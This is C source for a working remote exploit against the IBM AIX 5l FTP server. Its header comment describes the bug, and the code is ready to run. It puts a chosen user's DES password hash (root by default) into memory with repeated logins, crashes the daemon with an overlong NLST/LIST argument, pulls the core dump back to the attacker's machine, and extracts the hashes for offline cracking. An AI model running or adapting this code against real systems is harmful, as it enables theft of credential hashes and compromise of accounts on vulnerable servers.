/*
 * IBM AIX 5l FTPd Remote DES Hash Exploit -- Advanced 'Datacenter' Edition :>
 *
 * Should work on IBM AIX 5.1,5.2,5.3! probably on 4.X too
 *
 * bug found & exploited by Kingcope
 *
 * Version 2.0 - July 2010
 * ----------------------------------------------------------------------------
 * Description:                                                               -
 * The AIX 5l FTP-Server crashes when an overly long NLST command is supplied -
 * For example: NLST ~AAAAA...A (2000 A´s should be enough)                   -
 * The fun part here is that it creates a coredump file in the current        -
 * directory if it is set writable by the logged in user.                     -
 * The goal of the exploit is to get the DES encrypted user hashes            -
 * off the server. These can be later cracked with JtR.                       -
 * This is accomplished by populating the memory with logins of the user      -
 * we would like the encrypted hash from. Logging in three times with the     -
 * target username should be enough so that the DES hash is included in the   -
 * 'core' file.                                                               -
 * The FTPd banner looks like below.                                          -
 * 220 AIX5l FTP-Server (Version 4.1 Tue May 29 11:57:21 CDT 2001) ready.     -
 * 220 AIX5l FTP server (Version 4.1 Wed Mar 2 15:52:50 CST 2005) ready.      -
 * ----------------------------------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <fcntl.h>

int createconnection(char *target, char *targetport);
void getline(int s);
void putline(int s, char *out);
void usage(char *exe);

char in[8096];
char out[8096];

int main(int argc, char *argv[])
{
 extern int optind;
 extern char *optarg;
 int haveuser=0,havepassword=0;
 int s,s2,nsock;
 int c,k,len;
 int fd;

 char *target = NULL;
 char *username = "ftp";
 char *password = "guest";
 char *writeto = "pub";
 char *crackme = "root";
 char *targetport = "21";
 int uselist = 0;
 char *myip = NULL;
 char *as = NULL;
 int octet_in[4], port;
 struct sockaddr_in yo, cli;
 char *oct = NULL;

 while ((c = getopt(argc, argv, "h:i:p:l:k:d:c:s")) != EOF) {
  switch(c) {
  case 'h':
    target = (char*)malloc(strlen(optarg)+1);
    strcpy(target, optarg);
  break;
  case 'i':
    myip = (char*)malloc(strlen(optarg)+1);
    strcpy(myip, optarg);
  break;
  case 'p':
    targetport = (char*)malloc(strlen(optarg)+1);
    strcpy(targetport, optarg);
  break;
  case 'l':
    username = (char*)malloc(strlen(optarg)+1);
    strcpy(username, optarg);
    haveuser = 1;
  break;
  case 'k':
    password = (char*)malloc(strlen(optarg)+1);
    strcpy(password, optarg);
    havepassword = 1;
  break;
  case 'd':
    writeto = (char*)malloc(strlen(optarg)+1);
    strcpy(writeto, optarg);
  break;
  case 'c':
    crackme = (char*)malloc(strlen(optarg)+1);
    strcpy(crackme, optarg);
  break;
  case 's':
    uselist = 1;
  break;
  default:
    usage(argv[0]);
  }
 }

 if (target == NULL || myip == NULL)
  usage(argv[0]);

 if ((haveuser && !havepassword) || (!haveuser && havepassword)) {
  usage(argv[0]);
 }

 s = createconnection(target, targetport);
 getline(s);

 fprintf(stderr, "populating DES hash in memory...\n");

 for (k=0;k<3;k++) {
  snprintf(out, sizeof out, "USER %s\r\n", crackme);
  putline(s, out);
  getline(s);
  snprintf(out, sizeof out, "PASS abcdef\r\n");
  putline(s,out);
  getline(s);
 }

 fprintf(stderr, "logging in...\n");

 snprintf(out, sizeof out, "USER %s\r\n", username);
 putline(s, out);
 getline(s);
 snprintf(out, sizeof out, "PASS %s\r\n", password);
 putline(s,out);
 getline(s);
 getline(s);

 fprintf(stderr, "changing directory...\n");

 snprintf(out, sizeof out, "CWD %s\r\n", writeto);
 putline(s, out);
 getline(s);

 fprintf(stderr, "triggering segmentation violation...\n");

 as = (char*)malloc(2000);
 memset(as, 'A', 2000);
 as[2000-1]=0;

 if (!uselist) {
  snprintf(out, sizeof out, "NLST ~%s\r\n", as);
 } else {
  /* AIX 5.3 trigger - thanks to karol */
  snprintf(out, sizeof out, "LIST ~%s\r\n", as);
 }
 putline(s, out);

 memset(in, '\0', sizeof in);
 if (recv(s, in, sizeof in, 0) < 1) {
  printf("trigger succeeded!\nwaiting for core file to be created...\n");
 } else {
  printf("trigger seems to have failed, proceeding anyways...\n"
  "\nwaiting for core file to be created...\n");
 }

 sleep(5);

 close(s);

 s = createconnection(target, targetport);
 getline(s);

 fprintf(stderr, "logging in 2nd time...\n");

 snprintf(out, sizeof out, "USER %s\r\n", username);
 putline(s, out);
 getline(s);
 snprintf(out, sizeof out, "PASS %s\r\n", password);
 putline(s,out);
 getline(s);
 getline(s);

 fprintf(stderr, "changing directory...\n");

 snprintf(out, sizeof out, "CWD %s\r\n", writeto);
 putline(s, out);
 getline(s);

 fprintf(stderr, "getting core file...\n");

 snprintf(out, sizeof out, "TYPE I\r\n");
 putline(s, out);
 getline(s);

 port = getpid() + 1024;
 len = sizeof(cli);

 bzero(&yo, sizeof(yo));
 yo.sin_family = AF_INET;
 yo.sin_port=htons(port);
 yo.sin_addr.s_addr = htonl(INADDR_ANY);

 oct=(char *)strtok(myip,".");
 octet_in[0]=atoi(oct);
 oct=(char *)strtok(NULL,".");
 octet_in[1]=atoi(oct);
 oct=(char *)strtok(NULL,".");
 octet_in[2]=atoi(oct);
 oct=(char *)strtok(NULL,".");
 octet_in[3]=atoi(oct);

 snprintf(out, sizeof out, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);
 putline(s, out);
 getline(s);

 if ((s2=socket(AF_INET, SOCK_STREAM, 0)) < 0) {
  perror("socket");
  return -1;
 }

 if ((bind(s2, (struct sockaddr *) &yo, sizeof(yo))) < 0) {
  perror("bind");
  close(s2);
  exit(1);
 }

 if (listen(s2, 10) < 0) {
  perror("listen");
  close(s2);
  exit(1);
 }

 snprintf(out, sizeof out, "RETR core\r\n");
 putline(s, out);
 getline(s);
 if (strstr(in, "150") == NULL) {
  fprintf(stderr, "core file not found... terminating.\n");
  close(s);
  exit(1);
 }

 fd = open("core", O_WRONLY | O_CREAT);
 if (fd == -1) {
  perror("open on local core file");
  close(s);
  exit(1);
 }

 sleep(1);

 if ((nsock = accept(s2, (struct sockaddr *)&cli, &len)) < 0) {
  perror("accept");
  close(s);
  exit(1);
 }

 do {
  k = recv(nsock, in, sizeof in, 0);
  if (k < 1) break;
  write(fd, in, k);
 } while (k > 0);

 close(nsock);
 close(fd);
 close(s);

 fprintf(stderr, "finally extracting DES hashes from core file for user '%s'...\n", crackme);
 system("strings core | grep '^[A-Za-z0-9]\\{13\\}$'");

 fprintf(stderr, "done.\n");
 return 0;
}

int createconnection(char *target, char *targetport) {
 struct addrinfo hints, *res;
 int s;

 memset(&hints, 0, sizeof hints);
 hints.ai_family = AF_UNSPEC;
 hints.ai_socktype = SOCK_STREAM;

 if (getaddrinfo(target, targetport, &hints, &res)) {
  perror("getaddrinfo");
  exit(1);
 }

 s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
 if (s < 0) {
  perror("socket");
  exit(1);
 }

 if (connect(s, res->ai_addr, res->ai_addrlen) < 0) {
  perror("connect");
  exit(1);
 }

 return s;
}

void getline(int s)
{
 memset(in, '\0', sizeof in);
 if (recv(s, in, sizeof in, 0) < 1) {
  perror("recv");
  close(s);
  exit(1);
 }

 fprintf(stderr, "<\t%s", in);
}

void putline(int s, char *out) {
 fprintf(stderr, ">\t%s", out);

 if (send(s, out, strlen(out), 0) == -1) {
  perror("send");
  close(s);
  exit(1);
 }
}

void usage(char *exe)
{
 fprintf(stderr, "%s <-h host> <-i your internal ip> [-p port] [-l username] [-k password]"
 " [-d writable directory] [-c user to crack] [-s use 'LIST' command on AIX 5.3]\n",
exe);
 exit(0);
}